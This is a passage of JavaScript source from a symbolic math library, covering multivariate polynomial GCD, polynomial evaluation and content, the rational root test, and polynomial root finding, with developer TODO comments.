      return gcdByMultivariateModularAlgorithm(a._exponentiateRoots(g), b._exponentiateRoots(g))._exponentiateRoots(1 / g);
    }
  }

  if (!a.getContent().equals(Expression.ONE) || !b.getContent().equals(Expression.ONE)) {
    return Polynomial.polynomialGCD(a, b);
  }

  var y = getY(a, b) || getY(b, a);

  if (y == null) {
    return Polynomial.polynomialGCD(a, b);
  } //! https://www3.risc.jku.at/education/courses/ws2011/ca/3-gcd.pdf
  //if (a._hasIntegerLikeCoefficients() && b._hasIntegerLikeCoefficients()) {
  //  throw new RangeError();
  //}


  var M = Math.min(a.getDegree(), b.getDegree()); //TODO: +1 like in the book - ?
  //TODO: ?

  a = a.map(function (c) { return new Expression.Polynomial(Polynomial.toPolynomial(c, y)); });
  b = b.map(function (c) { return new Expression.Polynomial(Polynomial.toPolynomial(c, y)); });

  var toPolynomialByAnotherVar = function (p) {
    // x - top level var, y - second level var,
    // convert coefficients of coefficients to polynomials from x: c*x^0
    // make a polynomial (1*x^1+0*x^0)*y^0 and calculate the polynomial for it
    var topLevelVar = new Expression.Polynomial(Polynomial.of(new Expression.Polynomial(Polynomial.of(Expression.ZERO, Expression.ONE))));
    return p.map(function (c) { return new Expression.Polynomial(c.polynomial.map(function (c) { return new Expression.Polynomial(Polynomial.of(c)); })); }).calcAt(topLevelVar).polynomial;
  };

  var aByY = toPolynomialByAnotherVar(a);
  var bByY = toPolynomialByAnotherVar(b);
  var cgcd = aByY.getContent().gcd(bByY.getContent()).polynomial.primitivePart();

  if (!cgcd.equals(Polynomial.of(Expression.ONE))) {
    var divide = function (p) {
      return p.map(function (c) { return new Expression.Polynomial(c.polynomial.divideAndRemainder(cgcd, cgcd._hasIntegerLikeCoefficients() ? "throw" : undefined).quotient); }).calcAt(new Expression.Polynomial(Polynomial.of(y))).polynomial;
    };

    return gcdByMultivariateModularAlgorithm(divide(aByY), divide(bByY)).multiply(cgcd);
  }

  console.assert(cgcd.equals(Polynomial.of(Expression.ONE)));

  if (aByY.getDegree() === 0 || bByY.getDegree() === 0) {
    return Polynomial.of(Expression.ONE);
  } //var M2 = Math.min(aByY.getDegree(), bByY.getDegree());
  //if (M > M2) {
  //return toPolynomialByAnotherVar(gcdByMultivariateModularAlgorithm(aByY, bByY));
  //}


  var d = Polynomial.polynomialGCD(aByY.getLeadingCoefficient().polynomial, bByY.getLeadingCoefficient().polynomial);

  var interpolation = function () {
    NewtonInterpolation.setField(Expression._FIELD);
    var polynomialInterpolation = NewtonInterpolation();
    polynomialInterpolation.next();
    return polynomialInterpolation;
  };

  var integerLikeCoefficientsPolynomials = a._hasIntegerLikeCoefficients() && b._hasIntegerLikeCoefficients();

  var r = Expression.ZERO;
  var m = 0;
  var g = null;
  var gDegreeByY = 1 / 0;
  var polynomialInterpolation = null;

  while (true) {
    do {
      r = Expression.Integer.fromNumber(r.toNumber() + 1);

      if (r.toNumber() - M > 2) {
        console.error("!", r.toNumber() - M);
      }
    } while (d.calcAt(r).equals(Expression.ZERO));

    var g_r = Polynomial.polynomialGCD(a.calcAt(r).polynomial, b.calcAt(r).polynomial);

    if (g_r.getDegree() === 0) {
      return Polynomial.of(Expression.ONE); // as content by y is 1 (?)
    }

    if (g_r.getDegree() > gDegreeByY) {
      continue;
    }

    var d_xequalr = d.calcAt(r);
    g_r = g_r.scale(d_xequalr).scale(g_r.getLeadingCoefficient().inverse());

    if (integerLikeCoefficientsPolynomials && !g_r._hasIntegerLikeCoefficients()) {
      continue;
    }

    if (m === M + 1 || g_r.getDegree() < gDegreeByY) {
      //?
      m = 0;
      polynomialInterpolation = interpolation();
    }

    var oldG = g;
    g = Polynomial.from(polynomialInterpolation.next([r.toNumber(), new Expression.Polynomial(g_r)]).value);
    m += 1;
    gDegreeByY = g_r.getDegree(); //console.log(y.symbol, g.toString(), r, g_r.calcAt(y).toString());
    //if (g_r.getDegree() > Math.min(aByY.getDegree(), bByY.getDegree()) - 2) {//?
    //return Polynomial.polynomialGCD(originalA, originalB);
    //}

    if (integerLikeCoefficientsPolynomials) {
      if (g != null && !g._hasIntegerLikeCoefficients()) {
        debugger;
      }
    }

    if (oldG != null && oldG.equals(g) || m === M + 1) {
      if (!integerLikeCoefficientsPolynomials || g._hasIntegerLikeCoefficients()) {
        //TODO: multiply by d instead:
        g = toPolynomialByAnotherVar(toPolynomialByAnotherVar(g).primitivePart());

        if (!integerLikeCoefficientsPolynomials || g.getContent().equals(Expression.ONE)) {
          // Polynomial#isDivisibleBy is not checking for integer division (?)
          if (a.isDivisibleBy(g) && b.isDivisibleBy(g)) {
            g = g.map(function (c) { return c.polynomial.calcAt(y); });

            if (g.getLeadingCoefficient().isNegative()) {
              g = g.negate();
            }

            if (!integerLikeCoefficientsPolynomials) {
              g = g.primitivePart();
            }

            return g;
          }
        }

        g = oldG;
      } else {
        debugger;
      }
    }
  }
}

;
Polynomial._gcdByMultivariateModularAlgorithm = gcdByMultivariateModularAlgorithm;

Polynomial.prototype.calcAt = function (point) {
  //!!!
  if (point instanceof Expression.Division && point.getNumerator() instanceof Expression.Integer && point.getDenominator() instanceof Expression.Integer && this.hasIntegerCoefficients()) {
    var n = this.getDegree();

    var p = this._scaleRoots(point.getDenominator());

    return p.calcAt(point.getNumerator()).divide(point.getDenominator()._pow(n));
  }

  if ((point instanceof Expression.Symbol || point instanceof Expression.NthRoot) && this.hasIntegerCoefficients()) {
    var s = Expression.ZERO;

    for (var i = 0; i < this.a.size; i += 1) {
      var degree = this.a.degree(i);
      var coefficient = this.a.coefficient(i);
      s = s.add(coefficient.multiply(point._pow(degree)));
    }

    return s;
  }

  var n = Expression.ZERO;
  var lastDegree = -1;

  for (var i = 0; i < this.a.size; i += 1) {
    var degree = this.a.degree(i);
    var coefficient = this.a.coefficient(i);

    if (!n.equals(Expression.ZERO)) {
      n = Expression.pow(point, lastDegree - degree).multiply(n).add(coefficient);
    } else {
      n = coefficient;
    }

    lastDegree = degree;
  }

  if (!n.equals(Expression.ZERO)) {
    n = Expression.pow(point, lastDegree - 0).multiply(n);
  }

  return n;
};

Polynomial.prototype.getContent = function () {
  if (this.a.size === 0) {
    return Expression.ONE;
  }

  var denominator = Expression.ONE;
  var numerator = Expression.ZERO;

  for (var i = 0; i < this.a.size; i += 1) {
    var k = i % 2 === 0 ? i / 2 : this.a.size - (i + 1) / 2;
    var y = this.a.coefficient(k);
    denominator = denominator.lcm(y.getDenominator());
    numerator = numerator.gcd(y.getNumerator());
  }

  var c = numerator.divide(denominator);
  var x = this.a.coefficient(0);
  return x.isNegative() && !numerator.isNegative() || numerator.isNegative() && !x.isNegative() ? c.negate() : c;
}; // add, multiply, divideAndRemainder


Polynomial.prototype.negate = function () {
  //TODO: fix
  return this.map(function (coefficient) { return coefficient.negate(); });
};

Polynomial.prototype.subtract = function (l) {
  return this.add(l.negate());
};

Polynomial.prototype.scale = function (x) {
  if (x.equals(Expression.ONE)) {
    return this;
  }

  if (Expression.has(x, Expression.Matrix) || Expression.has(x, Expression.MatrixSymbol)) {
    throw new TypeError();
  }

  return this.map(function (coefficient) { return coefficient.multiply(x); });
};

Polynomial.fromTerms = function (terms) {
  var newData = new PolynomialData(terms.length);

  for (var i = 0; i < terms.length; i += 1) {
    var term = terms[i];
    newData.add(term.degree, term.coefficient);
  }

  return new Polynomial(newData);
};

Polynomial.toPolynomial = function (e, v) {
  if (e instanceof Expression.Division) {
    throw new RangeError();
  }

  var terms = Expression.getCoefficients(e, v);
  return Polynomial.fromTerms(terms);
};

Polynomial.prototype.toExpression = function (variableSymbol) {
  var result = undefined;

  for (var i = 0; i < this.a.size; i += 1) {
    var degree = this.a.degree(i);
    var coefficient = this.a.coefficient(i);
    var v = degree === 0 ? undefined : degree === 1 ? variableSymbol : new Expression.Exponentiation(variableSymbol, Expression.Integer.fromNumber(degree));
    var current = v == undefined ? coefficient : coefficient.equals(Expression.ONE) ? v : new Expression.Multiplication(coefficient, v);
    result = result == undefined ? current : new Expression.Addition(result, current);
  }

  return result == undefined ? Expression.ZERO : result;
}; // return a first founded root to simplify and as the next call may be called with reduced coefficients


Polynomial.prototype.doRationalRootTest = function () {
  var np = this;

  if (np.getCoefficient(0).equals(Expression.ZERO)) {
    return Expression.ZERO; //!TODO: test
  }

  var an = np.getLeadingCoefficient();
  var a0 = np.getCoefficient(0);
  a0 = Expression._expandTrigonometry(a0); //!

  if (np.getDegree() === 1) {
    return a0.negate().divide(an);
  } //TODO: http://en.wikipedia.org/wiki/Polynomial_remainder_theorem
  // http://scask.ru/g_book_mav.php?id=26


  var hasIntegerCoefficients = np.hasIntegerCoefficients(); // f(k) = q(k)(k - a)

  var fp1 = null;
  var fm1 = null;

  if (hasIntegerCoefficients) {
    fp1 = np.calcAt(Expression.ONE);

    if (fp1.equals(Expression.ZERO)) {
      return Expression.ONE;
    }

    fm1 = np.calcAt(Expression.ONE.negate());

    if (fm1.equals(Expression.ZERO)) {
      return Expression.ONE.negate();
    }
  }

  var filter = function (n, d) {
    if (fp1 != null) {
      if (d.subtract(n).equals(Expression.ZERO)) {
        return false;
      }

      if (!fp1.remainder(d.subtract(n)).equals(Expression.ZERO)) {
        return false;
      }
    }

    if (fm1 != null) {
      if (d.add(n).equals(Expression.ZERO)) {
        return false;
      }

      if (!fm1.remainder(d.add(n)).equals(Expression.ZERO)) {
        return false;
      }
    }

    return true;
  }; //!new 2020-01-13


  if (hasIntegerCoefficients) {
    //var tmp = np.squareFreeFactors();
    //if (tmp.a0.getDegree() > 0) {
    //  return tmp.a0.doRationalRootTest() || tmp.a1.doRationalRootTest();
    //}
    var roundDivision = function (a, b) {
      if (b.compareTo(Expression.ZERO) < 0) {
        b = b.negate();
        a = a.negate();
      }

      var e = b.truncatingDivide(Expression.TWO);

      if (a.compareTo(Expression.ONE) < 0) {
        e = e.negate();
      }

      return a.add(e).truncatingDivide(b);
    };

    var toInteger = function (zero, scale) {
      //TODO: ?
      var interval = zero instanceof Expression.ExpressionPolynomialRoot ? zero.root._root.toDecimal(scale.abs().bitLength()) : zero.toDecimal(scale.abs().bitLength());
      var fraction = interval.a.add(interval.b).divide(Expression.TWO);
      return roundDivision(scale.multiply(fraction.getNumerator()), fraction.getDenominator());
    };

    var precision = an.abs().bitLength(); // note: for fractionDigits (!)

    var zeros = np.getZeros(precision);

    for (var i = 0; i < zeros.length; i += 1) {
      var zero = zeros[i];

      if (i === 0 || zero !== zeros[i - 1]) {
        var candidate = zero.root != null ? toInteger(zero, an).divide(an) : zero.getNumerator() instanceof Expression.Integer && zero.getDenominator() instanceof Expression.Integer ? zero : Expression.ZERO;

        if (filter(candidate.getNumerator(), candidate.getDenominator()) && np.calcAt(candidate).equals(Expression.ZERO)) {
          return candidate;
        }
      }
    }

    return null;
  }
  /*
  TODO:
  k = k
  f(k) = fk
  t = x + k
  x = t - k
  f(t) = f(x + k) = an * x**n + ... + f(k)
  */


  var result = null; // p/q
  //TODO: forEach -> some ?

  Expression.everyDivisor(a0, function (p) {
    return Expression.everyDivisor(an, function (q) {
      var sign = -3;

      while ((sign += 2) < 3) {
        var sp = sign === -1 ? p.negate() : p;

        if ( //sp.gcd(q).equals(Expression.ONE) &&
        filter(sp, q)) {
          //?
          var x = Polynomial.of(sp.negate(), q);
          var z = np.divideAndRemainder(x, "undefined");
          var r = z == undefined ? undefined : z.remainder.map(function (x) {
            return x.simplifyExpression();
          });

          if (r != undefined && r.equals(Polynomial.ZERO)) {
            result = sp.divide(q);
            return false;
          }
        }
      }

      return true;
    });
  });
  return result;
};

Polynomial.prototype._testCoefficients = function (f) {
  for (var i = 0; i < this.a.size; i += 1) {
    if (!f(this.a.coefficient(i))) {
      return false;
    }
  }

  return true;
};

Polynomial.prototype.hasIntegerCoefficients = function () {
  return this._testCoefficients(function (c) { return c instanceof Expression.Integer; });
};

Polynomial.prototype.hasComplexCoefficients = function () {
  return this._testCoefficients(function (c) { return c instanceof Expression.Complex || c instanceof Expression.Integer; });
};

var isIntegerLike = function (c) {
  if (c instanceof Expression.Integer) {
    return true;
  }

  if (c instanceof Expression.Symbol) {
    if (c instanceof Expression.ExpressionWithPolynomialRoot) {
      //TODO: ?
      return false;
    }

    if (c instanceof Expression.ExpressionPolynomialRoot) {
      //TODO: ?
      return false;
    }

    if (c instanceof Expression.PolynomialRootSymbol) {
      //TODO: remove
      return true;
    }

    return true;
  }

  if (c instanceof Expression.Addition) {
    return isIntegerLike(c.a) && isIntegerLike(c.b);
  }

  if (c instanceof Expression.Multiplication) {
    return isIntegerLike(c.a) && isIntegerLike(c.b);
  }

  if (c instanceof Expression.Exponentiation) {
    return isIntegerLike(c.a) && c.b instanceof Expression.Integer && c.b.compareTo(Expression.TWO) >= 0;
  }

  if (c instanceof Expression.Polynomial) {
    return c.polynomial._hasIntegerLikeCoefficients();
  }

  return false;
}; //Expression._isIntegerLike = isIntegerLike;


Polynomial._isIntegerLike = isIntegerLike;

Polynomial.prototype._hasIntegerLikeCoefficients = function () {
  return this._testCoefficients(function (c) { return Polynomial._isIntegerLike(c); });
};

Polynomial.prototype._canBeFactored = function (depth) {
  // https://en.wikipedia.org/wiki/Eisenstein%27s_criterion
  if (!this.hasIntegerCoefficients()) {
    //throw new Error();
    return true;
  }

  if (this.getCoefficient(0).equals(Expression.ZERO)) {
    return true;
  }

  var content = this.getContent();

  if (!content.equals(Expression.ONE) && !content.equals(Expression.ONE.negate())) {
    return this.scale(content.inverse())._canBeFactored();
  } // p divides each a_i for 0 â‰¤ i < n


  var g = this.subtract(Polynomial.of(this.getLeadingCoefficient()).shift(this.getDegree())).getContent(); // p does not divide a_n

  var x = null;

  do {
    x = g.gcd(this.getLeadingCoefficient());
    g = g.truncatingDivide(x);
  } while (!x.equals(Expression.ONE));

  var x = null;
  g = g.abs(); //?

  while (!g.equals(Expression.ONE)) {
    var p = g.primeFactor(); // p**2 does not divide a_0

    if (!this.getCoefficient(0).remainder(p._pow(2)).equals(Expression.ZERO)) {
      return false;
    }

    g = g.truncatingDivide(p);
  }

  if (depth == undefined) {
    // see https://en.wikipedia.org/wiki/Eisenstein%27s_criterion#Indirect_(after_transformation)
    //TODO: ?
    if (!this._translateRoots(Expression.Integer.fromNumber(3).negate())._canBeFactored(1)) {
      return false;
    } //TODO: (too slow)
    //if (!this._exponentiateRoots(-1)._canBeFactored(1)) {
    //  return false;
    //}

  }

  return true;
};

Polynomial.prototype.isEven = function () {
  return this.getGCDOfTermDegrees() % 2 === 0;
};

var counter = 0; //TODO: remove

Polynomial.prototype.getGCDOfTermDegrees = function () {
  if (this.equals(Polynomial.ZERO)) {
    return 0;
  }

  var g = this.getDegree();

  for (var i = 1; i <= this.getDegree() && g >= 2; i += 1) {
    if (!this.getCoefficient(i).equals(Expression.ZERO)) {
      g = Math.gcd(g, i);
    }
  }

  return g;
};

Polynomial.prototype.getroots = function (callback) {
  //TODO: merge hit and callback
  callback = callback || undefined;
  var np = this;
  var roots = []; //!new 2018-12-24
  //TODO: fix (?Polynomial#getContent()?)

  var ct = Expression.ONE;
  var t = Expression.ZERO;

  while (t != null) {
    var t = Expression.getConjugate(np.getLeadingCoefficient());

    if (t != undefined) {
      np = np.scale(t);
      ct = ct.multiply(t);
    }
  } //!
  //!new 2020-07-11


  np = np.map(function (x) {
    return x.simplifyExpression();
  }); //!

  var content = np.getContent();

  if (!content.equals(Expression.ONE)) {
    np = np.scale(content.getDenominator()).divideAndRemainder(Polynomial.of(content.getNumerator()), "throw").quotient; //np = np.divideAndRemainder(Polynomial.of(content), "throw").quotient;
  }

  if (!ct.equals(Expression.ONE)) {
    content = content.divide(ct);
  } // x = 0


  while (np.getCoefficient(0).equals(Expression.ZERO)) {
    np = np.divideAndRemainder(Polynomial.of(Expression.ZERO, Expression.ONE), "throw").quotient;
    roots.push(Expression.ZERO);
  }

  if (!content.equals(Expression.ONE) && !content.equals(Expression.ONE.negate()) || roots.length > 0) {
    if (roots.length > 0) {
      if (typeof hit === "function") {
        hit({
          getroots: {
            special: "0"
          }
        });
      }
    }

    if (callback != undefined) {
      callback({
        content: content,
        roots: roots,
        newPolynomial: np,
        type: "factorOutTheGreatestCommonFactor"
      });
    }
  }

  if (np.getDegree() === 1) {
    roots.push(np.getCoefficient(0).negate().divide(np.getCoefficient(1)));
    np = Polynomial.of(np.getLeadingCoefficient());

    if (typeof hit === "function") {
      hit({
        getroots: {
          linear: ""
        }
      });
    }

    if (callback != undefined) {
      callback({
        content: content,
        roots: roots,
        newPolynomial: np,
        type: "solveLinearEquation"
      });
    }

    return roots;
  }

  var nthRootInternal = function (n, x) {
    if (x instanceof Expression.ExpressionWithPolynomialRoot) {
      //TODO: !?
      return undefined; //?
      //return x._nthRoot(n);
    }

    if (x instanceof Expression.ExpressionPolynomialRoot) {
      //return undefined;//?
      return x._nthRoot(n);
    }

    if (x instanceof Expression.Division) {
      var sa1 = nthRootInternal(n, x.a);
      var sb1 = nthRootInternal(n, x.b);
      return sa1 == undefined || sb1 == undefined ? undefined : sa1.divide(sb1);
    }

    if (x instanceof Expression.Exponentiation) {
      var N = Expression.Integer.fromNumber(n);

      if (x.b instanceof Expression.Integer) {
        if (x.b.remainder(N).equals(Expression.ZERO)) {
          return x.a.pow(x.b.divide(N));
        } //return undefined;

      }

      if (x.a instanceof Expression.Integer || x.a === Expression.E) {
        //?
        return x.a.pow(x.b.divide(N));
      }

      if (x.b instanceof Expression.Division && x.b.a instanceof Expression.Integer && x.b.a.remainder(N).equals(Expression.ZERO)) {
        //TODO:
        return x.a.pow(x.b.divide(N));
      }
    }

    if (x instanceof Expression.Multiplication) {
      var sa = nthRootInternal(n, x.a);
      var sb = nthRootInternal(n, x.b);
      return sa == undefined || sb == undefined ? undefined : sa.multiply(sb);
    }

    if (x instanceof Expression.Complex || Expression.isConstant(x) && Expression.has(x, Expression.Complex)) {
      //TODO: - ?
      //var real = x.real;
      //var imaginary = x.imaginary;
      var c = Expression.getComplexNumberParts(x);
      var real = c.real;
      var imaginary = c.imaginary;

      if (n === 2) {
        var m = real.multiply(real).add(imaginary.multiply(imaginary)).squareRoot();
        var a = nthRootInternal(2, real.add(m).divide(Expression.TWO));

        if (a != undefined) {
          var b = imaginary.divide(Expression.TWO.multiply(a));
          var result = a.add(b.multiply(Expression.I));
          return result;
        }
      }

      if (real.equals(Expression.ZERO) && n % 2 === 0) {
        var c = nthRootInternal(Math.floor(n / 2), x);

        if (c != undefined) {
          return nthRootInternal(2, c);
        }
      }

      if (real.equals(Expression.ZERO) && n % 2 === 1) {
        //?
        var c = nthRootInternal(n, imaginary);

        if (c != undefined) {
          return c.multiply(n % 4 === 1 ? Expression.I : Expression.I.negate());
        }
      } //!new 2020-07-24


      if (x instanceof Expression.Complex && !imaginary.equals(Expression.ZERO)) {
        //?TODO: ?
        // https://en.wikipedia.org/wiki/Complex_number#Modulus_and_argument
        var rho = real._pow(2).add(imaginary._pow(2)).squareRoot();

        try {
          var phi = Expression.TWO.multiply(imaginary.divide(rho.add(real)).arctan());
          return rho._nthRoot(n).multiply(Expression.I.multiply(phi.divide(Expression.Integer.fromNumber(n))).exp());
        } catch (error) {
          //TODO: ?
          console.debug(error);
        }
      }
    }

    if (x instanceof Expression.Addition) {
      var lastFactor = undefined;
      var e = 0;
      var result = Expression.ONE;
      var rest = Expression.ONE;
      var t = x;

      while (!t.equals(Expression.ONE) && !t.equals(Expression.ONE.negate())) {
        var f = Expression.simpleDivisor(t);

        if (e === 0) {
          lastFactor = f;
          e += 1;
        } else if (f.equals(lastFactor)) {
          e += 1;

          if (e === n) {
            e = 0;
            result = result.multiply(lastFactor);
          }
        } else if (e !== 0) {
          rest = rest.multiply(Expression.pow(lastFactor, e));
          lastFactor = f;
          e = 1;
        }

        t = t.divide(f);
      }

      if (result !== Expression.ONE) {
        if (e !== 0) {
          rest = rest.multiply(Expression.pow(lastFactor, e));
        }

        if (t.equals(Expression.ONE.negate())) {
          rest = rest.multiply(t);
        }

        var rn = nthRootInternal(n, rest);

        if (rn != undefined) {
          return result.multiply(rn);
        }
      }
    }

    if (x instanceof Expression.Exponentiation && x.a instanceof Expression.Symbol) {
      var b = x.b.divide(Expression.Integer.fromNumber(n));
      return b.equals(Expression.ONE) ? x.a : new Expression.Exponentiation(x.a, b);
    }

    if (!Expression.isConstant(x) && x.isNegative() && (n === 2 || n % 2 !== 0)) {
      x = x.negate();
      var c = nthRootInternal(n, x);
      return c == null ? null : Expression.ONE.negate()._nthRoot(n).multiply(c);
    }

    if ((x instanceof Expression.Integer || x instanceof Expression.Complex) && x.isNegative() && n % 2 === 0) {
      //?
      var c = x instanceof Expression.Integer ? x._nthRoot(2) : nthRootInternal(2, x);
      return c == null ? null : nthRootInternal(n / 2, c);
    }

    if (Expression.has(x, Expression.Sin) || Expression.has(x, Expression.Cos)) {
      //?
      var tmp = nthRootInternal(2, Expression._replaceSinCos(x));

      if (tmp != null) {
        return Expression._replaceBySinCos(tmp).simplifyExpression(); //?
      }
    }

    var y = undefined;

    try {
      y = x._nthRoot(n);
    } catch (error) {
      //TODO:
      console.error(error);
    }

    if (y == undefined) {
      //?
      var a = x; //TODO: different cases (1+sqrt(2)+sqrt(3)) - (?)

      var ac = Expression.getConjugateExpression(a.getNumerator());

      if ((n === 3 || n === 2) && ac instanceof Expression.Integer) {
        //TODO: ?
        if (n === 2 && Expression._isPositive(x.negate())) {
          return Expression.I.multiply(nthRootInternal(2, x.negate()));
        } //TODO: a > 0 - ?


        var a = x;

        var tmp = new Expression.Symbol('x')._pow(n).subtract(a).getNumerator();

        var polynomial = Polynomial.toPolynomial(Expression.getConjugateExpression(tmp), new Expression.Symbol('x'));
        var tmp2 = polynomial.getZeros(); //TODO: ?

        for (var iteratorzero = tmp2[globalThis.Symbol.iterator](), zero = iteratorzero.next().value; zero != null; zero = iteratorzero.next().value) {
          if (zero._pow(n).equals(x)) {
            return zero;
          }
        } //TODO: fix


        return null;
      }
    }

    return y;
  };

  var nthRoot = function (n, x, np) {
    if (n === 1) {
      return x;
    }

    var y = nthRootInternal(n, x);

    if (y == undefined) {
      if (!(x instanceof Expression.Integer)) {
        if (typeof hit === "function") {
          hit({
            nthRoot: (n === 2 ? "squareRoot" : n + "-root") + ":" + x.toString() + ":" + np.toString()
          });
        }
      }
    }

    return y;
  };

  var continueWithNewPolynomial = function (roots, np, newPolynomialVariable) {
    var rs = np.getroots(callback != undefined ? function (info) {
      var xxx = Object.assign({}, info, {
        content: content.multiply(info.content),
        roots: roots.concat(info.roots),
        newPolynomialVariable: newPolynomialVariable
      });
      callback(xxx);
    } : undefined);

    for (var i = 0; i < rs.length; i += 1) {
      roots.push(rs[i]);
    }
  };

  if (np.getDegree() >= 2) {
    var g = np.getGCDOfTermDegrees();

    if (g >= 2) {
      var allZeros = g === np.getDegree();

      if (typeof hit === "function") {
        if (g === np.getDegree()) {
          hit({
            getroots: {
              allZeros: ""
            }
          });
        } else {
          hit({
            getroots: g % 2 === 0 ? np.getDegree() === 4 ? {
              biquadratic: ""
            } : {
              even: ""
            } : {
              xyz: np.toString()
            }
          });
        }
      } // t = x^g


      var newData = new Array(Math.floor((np.getDegree() + g) / g));
      var k = 0;

      for (var i = 0; i <= np.getDegree(); i += g) {
        newData[k] = np.getCoefficient(i);
        k += 1;
      }

      var q = Polynomial.from(newData);
      var qRoots = [];

      if (!allZeros) {
        if (callback != undefined) {
          callback({
            content: content,
            roots: roots,
            newPolynomial: q,
            type: "t = x^g",
            g: g,
            newPolynomialVariable: new Expression.Symbol('t')
          }); //TODO: ?
        }

        continueWithNewPolynomial(qRoots, q, new Expression.Symbol('t'));
      } else {
        qRoots = q.getroots();
      }

      var n = np.getDegree(); //TODO: 2018-02-04
      //var ok = false;//?

      for (var k = 0; k < qRoots.length; k += 1) {
        var qRoot = qRoots[k];
        var s = nthRoot(g, qRoot, np);

        if (s != undefined) {
          var d = null;

          if ((!allZeros || g >= 5 || !np.hasIntegerCoefficients()) && (g <= 24 && (17896830 >> g) % 2 === 1 || g === 48)) {
            d = Polynomial.of(Expression.ONE).shift(g).add(Polynomial.of(qRoot.negate())); // https://en.wikipedia.org/wiki/Root_of_unity

            var c = Expression.E.pow(Expression.I.multiply(Expression.TWO.multiply(Expression.PI)).divide(Expression.Integer.fromNumber(g)));
            var cInI = Expression.ONE;

            for (var i = 0; i < g; i += 1) {
              var root = cInI.multiply(s);
              cInI = cInI.multiply(c);
              roots.push(root);
            }
          } else {
            roots.push(s);
            d = Polynomial.of(s.negate(), Expression.ONE);

            if (g % 2 === 0) {
              roots.push(s.negate());
              d = Polynomial.of(s.multiply(s).negate(), Expression.ZERO, Expression.ONE);
            }
          }

          var quotient = np.divideAndRemainder(d).quotient;
          console.assert(np.subtract(quotient.multiply(d)).map(function (c) { return c.simplifyExpression(); }).getDegree() < 0);
          np = quotient;
        } //ok = ok || Expression.has(qRoot, Expression.Complex);//?

      }

      if (!allZeros) {
        if (callback != undefined) {
          callback({
            content: content,
            roots: roots,
            newPolynomial: np,
            type: "x = t^(1/g)",
            g: g
          }); //TODO: ?
        }
      } else {
        var type = g === 2 ? "applyDifferenceOfSquaresRule" : g === 3 ? "applyDifferenceOfCubesRule" : "applyDifferenceOfNthPowersRule";

        if (callback != undefined) {
          callback({
            content: content,
            roots: roots,
            newPolynomial: np,
            type: type,
            g: g
          }); //TODO: ?
        }
      }

      var ok = true;

      if (n !== np.getDegree() && ok && np.getDegree() > 0) {
        continueWithNewPolynomial(roots, np);
      }

      return roots;
    }
  } //! new: solution of quadratic equations


  if (np.getDegree() === 2) {
    var a = np.getCoefficient(2);
    var b = np.getCoefficient(1);
    var c = np.getCoefficient(0);
    var D = b.multiply(b).subtract(Expression.TWO.multiply(Expression.TWO).multiply(a).multiply(c));
    D = D.simplifyExpression();
    var sD = nthRoot(2, D, np);

    if (typeof hit === "function") {
      hit({
        getroots: {
          quadratic: sD == undefined ? D instanceof Expression.Integer ? D.compareTo(Expression.ZERO) : "?" + D.toString() : "OK"
        }
      });
    }

    if (sD != undefined) {
      if (sD.equals(Expression.ZERO)) {
        var x12 = b.negate().divide(Expression.TWO.multiply(a));
        roots.push(x12);
        roots.push(x12); //TODO: different details (?)
      } else {
        var x1 = b.negate().subtract(sD).divide(Expression.TWO.multiply(a));
        var x2 = b.negate().add(sD).divide(Expression.TWO.multiply(a));
        roots.push(x1);
        roots.push(x2);
      }

      np = Polynomial.of(np.getLeadingCoefficient());

      if (callback != undefined) {
        callback({
          content: content,
          roots: roots,
          newPolynomial: np,
          type: "solveQuadraticEquation"
        });
      }

      return roots;
    }
  } //TODO: odd degrees ?


  if (np.getDegree() >= 4 && np.getDegree() % 2 === 0) {
    var middle = Math.floor(np.getDegree() / 2);
    var j = 1;

    while (j < middle + 1 && np.getCoefficient(middle + j).equals(Expression.ZERO) && np.getCoefficient(middle - j).equals(Expression.ZERO)) {
      j += 1;
    }

    if (j < middle + 1 && !np.getCoefficient(middle + j).equals(Expression.ZERO) && !np.getCoefficient(middle - j).equals(Expression.ZERO)) {
      var jj = Expression.Integer.fromNumber(j);
      var mj = np.getCoefficient(middle + j).divide(np.getCoefficient(middle - j));
      var isQuasiPalindromic = true;

      for (var i = 2; i < middle + 1 && isQuasiPalindromic; i += 1) {
        isQuasiPalindromic = isQuasiPalindromic && np.getCoefficient(middle + i).pow(jj).subtract(np.getCoefficient(middle - i).pow(jj).multiply(mj.pow(Expression.Integer.fromNumber(i)))).equals(Expression.ZERO);
      }

      if (isQuasiPalindromic) {
        //TODO: fix
        if (typeof hit === "function") {
          hit({
            getroots: {
              quasiPalindromic: np.getDegree()
            }
          });
        }
      }

      if (isQuasiPalindromic && np.getDegree() <= Math.log2(Number.MAX_SAFE_INTEGER + 1)) {
        var substitute = function (m, np) {
          // t = mx + 1 / x
          // https://stackoverflow.com/a/15302448/839199
          var choose = function (n, k) {
            return k === 0 ? 1 : Math.floor(n * choose(n - 1, k - 1) / k);
          };

          var p = function (n, i, mpi) {
            return n - 2 * i >= 0 ? p(n - 2 * i, 1, m).scale(Expression.Integer.fromNumber(choose(n, i)).multiply(mpi).negate()).add(p(n, i + 1, mpi.multiply(m))) : Polynomial.of(Expression.ONE).shift(n);
          };

          var f = function (n, i) {
            return i <= n ? p(n - i, 1, m).scale(np.getCoefficient(i)).add(f(n, i + 1)) : Polynomial.ZERO;
          };

          return f(Math.floor(np.getDegree() / 2), 0);
        };

        var m = j === 1 ? mj : nthRoot(j, mj, np); // TODO: check the result of nthRoot - ?
        // t = mx + 1 / x

        var pt = substitute(m, np); //var pt = Polynomial.of(np.getCoefficient(2).subtract(Expression.ONE.add(Expression.ONE).multiply(m).multiply(np.getCoefficient(0))), np.getCoefficient(1), np.getCoefficient(0));

        var ptRoots = pt.getroots();

        for (var i = 0; i < ptRoots.length; i += 1) {
          var ptRoot = ptRoots[i]; // mx^2 - tx + 1 = 0

          var u = Polynomial.of(Expression.ONE, ptRoot.negate(), m);
          var uRoots = u.getroots();

          for (var j = 0; j < uRoots.length; j += 1) {
            var root = uRoots[j]; //np = np.divideAndRemainder(Polynomial.of(root.negate(), Expression.ONE)).quotient;//TODO: optimize

            roots.push(root);
          }

          np = np.divideAndRemainder(u.scale(u.getLeadingCoefficient().inverse())).quotient; //TODO: multiply by "newU"
        }

        if (callback != undefined) {
          callback({
            content: content,
            roots: roots,
            newPolynomial: np,
            type: "solvePalindromicEquaion"
          });
        }

        return roots;
      }
    }
  }

  if (np.getDegree() >= 2) {
    //?
    // (ax+b)**n = a**n*x**n + n*a**(n-1)*x**(n-1)*b + ...
    //?
    // a**n
    // n*a**(n-1)*b
    var n = np.getDegree();

    var hasZeroCoefficient = function (np) {
      for (var i = 0; i <= np.getDegree(); i += 1) {
        if (np.getCoefficient(i).equals(Expression.ZERO)) {
